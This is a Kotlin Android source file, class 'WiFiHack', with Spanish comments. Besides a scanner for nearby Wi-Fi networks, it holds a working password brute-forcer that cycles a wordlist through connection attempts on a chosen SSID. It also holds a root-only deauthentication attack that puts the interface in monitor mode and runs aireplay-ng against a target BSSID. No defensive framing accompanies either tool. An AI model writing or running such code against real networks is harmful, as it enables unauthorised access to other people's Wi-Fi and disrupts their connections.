package com.industrialble.network

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.wifi.ScanResult
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import com.industrialble.tools.RootChecker
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.callbackFlow
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.concurrent.atomic.AtomicBoolean

class WiFiHack(private val context: Context) {

    private val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
    private val bruteForceCancelled = AtomicBoolean(false)

    data class WiFiNetwork(
        val ssid: String,
        val bssid: String,
        val level: Int,
        val frequency: Int,
        val capabilities: String,
        val encryption: String = "",
        val channel: Int = 0
    )

    fun isWifiEnabled(): Boolean = wifiManager.isWifiEnabled

    fun getScanResults(): List<WiFiNetwork> {
        if (!wifiManager.isWifiEnabled) return emptyList()
        return try {
            wifiManager.scanResults
                .distinctBy { it.BSSID }
                .map { result ->
                    WiFiNetwork(
                        ssid = result.SSID,
                        bssid = result.BSSID,
                        level = result.level,
                        frequency = result.frequency,
                        capabilities = result.capabilities,
                        encryption = detectEncryption(result),
                        channel = freqToChannel(result.frequency)
                    )
                }
                .sortedByDescending { it.level }
        } catch (_: Exception) { emptyList() }
    }

    fun startScanWithFlow(): Flow<List<WiFiNetwork>> = callbackFlow {
        if (!wifiManager.isWifiEnabled) { trySend(emptyList()); close(); return@callbackFlow }

        val receiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                if (intent.action == WifiManager.SCAN_RESULTS_AVAILABLE_ACTION) {
                    ctx.unregisterReceiver(this)
                    trySend(getScanResults()); close()
                }
            }
        }
        context.registerReceiver(receiver, IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION))
        if (!wifiManager.startScan()) { context.unregisterReceiver(receiver); trySend(emptyList()); close() }
        awaitClose { try { context.unregisterReceiver(receiver) } catch (_: Exception) {} }
    }

    fun getSavedNetworks(): List<String> = try {
        wifiManager.configuredNetworks.map { it.SSID }
    } catch (_: Exception) { emptyList() }

    /** Cancela la fuerza bruta en curso */
    fun cancelBruteForce() { bruteForceCancelled.set(true) }

    /** Fuerza bruta con velocidad personalizable y cancelable */
    @Suppress("DEPRECATION")
    fun bruteForce(
        ssid: String,
        passwords: List<String>,
        delayMs: Int = 2000,
        onProgress: (Int, Int, String) -> Unit,
        onFound: (String) -> Unit,
        onFinish: (Boolean) -> Unit
    ) {
        bruteForceCancelled.set(false)
        Thread {
            val cleanSsid = "\"${ssid.removeSurrounding("\"")}\""
            val targetSsid = cleanSsid.removeSurrounding("\"") // SSID sin comillas para comparar
            for ((index, password) in passwords.withIndex()) {
                if (bruteForceCancelled.get()) { onFinish(false); return@Thread }
                onProgress(index + 1, passwords.size, password)
                try {
                    val config = WifiConfiguration().apply {
                        SSID = cleanSsid
                        allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
                        if (password.isNotEmpty()) {
                            preSharedKey = "\"$password\""
                            allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK)
                        }
                    }
                    val netId = wifiManager.addNetwork(config)
                    if (netId != -1) {
                        wifiManager.disconnect()
                        Thread.sleep(300) // esperar a que se complete la desconexión
                        if (wifiManager.enableNetwork(netId, true)) {
                            Thread.sleep(delayMs.toLong())
                            val info = wifiManager.connectionInfo
                            // Comparar SSIDs sin comillas para compatibilidad con Android 12+
                            // (getSSID() devuelve sin comillas en API 31+, con comillas en versiones anteriores)
                            if (info != null) {
                                val connectedSsid = info.ssid?.removeSurrounding("\"") ?: ""
                                if (connectedSsid == targetSsid && info.networkId == netId) {
                                    onFound(password); onFinish(true); return@Thread
                                }
                            }
                        }
                        wifiManager.removeNetwork(netId)
                        wifiManager.saveConfiguration()
                        wifiManager.reconnect()
                        Thread.sleep(200) // esperar antes del siguiente intento
                    }
                } catch (_: Exception) {}
            }
            onFinish(false)
        }.start()
    }

    /** Lee un archivo de wordlist desde la terminal (para importar .txt) */
    fun parseWordlistFromText(text: String): List<String> {
        return text.lines()
            .map { it.trim() }
            .filter { it.isNotBlank() && !it.startsWith("#") && it.length >= 4 }
            .distinct()
    }

    fun deauthAttack(bssid: String, interfaceName: String = "wlan0", onLog: (String) -> Unit) {
        Thread {
            onLog("🔴 Verificando root...")
            val root = RootChecker.check(context)
            if (!root.isRooted) { onLog("❌ Se requiere root"); return@Thread }
            onLog("📡 Preparando interfaz...")
            RootChecker.execRootCommand("ip link set $interfaceName down")
            RootChecker.execRootCommand("iw dev $interfaceName set type monitor")
            RootChecker.execRootCommand("ip link set $interfaceName up")
            onLog("⚠️ Enviando deauth a $bssid...")
            RootChecker.execRootCommand("aireplay-ng -0 5 -a $bssid $interfaceName")
            onLog("🔧 Restaurando...")
            RootChecker.execRootCommand("ip link set $interfaceName down")
            RootChecker.execRootCommand("iw dev $interfaceName set type managed")
            RootChecker.execRootCommand("ip link set $interfaceName up")
            onLog("✅ Deauth completado")
        }.start()
    }

    private fun detectEncryption(result: ScanResult): String {
        val cap = result.capabilities
        return when {
            cap.contains("WPA3") -> "WPA3"
            cap.contains("WPA2") -> "WPA2"
            cap.contains("WPA") -> "WPA"
            cap.contains("WEP") -> "WEP"
            else -> "Abierta"
        }
    }

    private fun freqToChannel(freq: Int): Int = when {
        freq in 2412..2484 -> (freq - 2412) / 5 + 1
        freq in 5170..5825 -> (freq - 5170) / 5 + 34
        else -> 0
    }
}
